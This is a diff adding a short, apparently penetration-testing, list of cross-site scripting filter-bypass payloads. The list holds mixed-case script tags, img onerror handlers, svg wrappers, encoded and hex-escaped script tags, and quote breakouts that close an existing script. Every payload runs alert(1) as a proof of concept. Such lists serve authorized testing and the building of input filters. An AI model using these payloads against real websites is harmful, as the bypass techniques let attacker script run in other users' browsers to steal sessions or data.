@@ -1,0 +1,18 @@
+# XSS - Filter Bypass Payloads
+<ScRiPt>alert(1)</ScRiPt>
+<script>alert`1`</script>
+<script>alert(String.fromCharCode(88,83,83))</script>
+<img src=x onerror="alert(1)">
+<img src=x onerror='alert(1)'>
+<svg><script>alert(1)</script></svg>
+<svg><script>alert&#40;1&#41;</script>
+%3Cscript%3Ealert(1)%3C/script%3E
+\x3cscript\x3ealert(1)\x3c/script\x3e
+<script>alert(1)//
+<SCRIPT>alert(1)</SCRIPT>
+<Script>alert(1)</Script>
+<script type="text/javascript">alert(1)</script>
+";alert(1);"
+';alert(1);'
+</script><script>alert(1)</script>
+<img """><script>alert(1)</script>">
